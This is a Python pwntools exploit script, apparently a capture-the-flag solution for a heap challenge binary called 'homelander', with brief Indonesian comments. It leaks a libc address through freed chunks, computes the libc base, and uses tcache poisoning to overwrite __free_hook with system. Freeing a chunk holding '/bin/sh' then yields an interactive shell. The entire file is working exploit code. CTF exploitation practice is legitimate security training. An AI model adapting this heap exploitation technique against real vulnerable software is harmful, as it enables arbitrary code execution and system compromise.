from pwn import *

def add(page, size, text):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("(1-16): ", str(page))
    p.sendlineafter("Length: ", str(size))
    p.sendlineafter("Text: ", text)

def delete(page):
    p.sendlineafter("Choice: ", "4")
    p.sendlineafter("(1-16): ", str(page))

def show(page):
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("(1-16): ", str(page))
    p.recvuntil("Dear diary,\n")
    return p.recvline(False) # False agar character tidak di ubah ke byte

def edit(page, text):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("(1-16): ", str(page))
    p.sendlineafter("New text: ", text)

def exploit():
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so', checksec=False)
    for i in range(1, 8):
        add(i, 0x80, "Gladys")
    
    for i in range(1, 7):
        delete(2)
    
    delete(1)
    delete(1)

    libc_leak = u64(show(1).ljust(8, "\x00"))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - 0x3ebca0 # Dapet dari gdb, leaked address - address awal dari vmmap libc = 0x3ebca0
    log.info("Libc base : {}".format(hex(libc.address)))
    libc_free_hook = libc.symbols["__free_hook"]
    log.info("Libc __free_hook : {}".format(hex(libc_free_hook)))
    libc_system = libc.symbols["system"]
    log.info("Libc system : {}".format(hex(libc_system)))

    #edit(2, '/bin/sh\x00')
    edit(1, p64(libc_free_hook))
    add(8, 0x80, '/bin/sh')
    add(9, 0x80, p64(libc_system))
    delete(8)

    p.interactive()

if __name__ == "__main__":
    p = process("./homelander")
    exploit() 
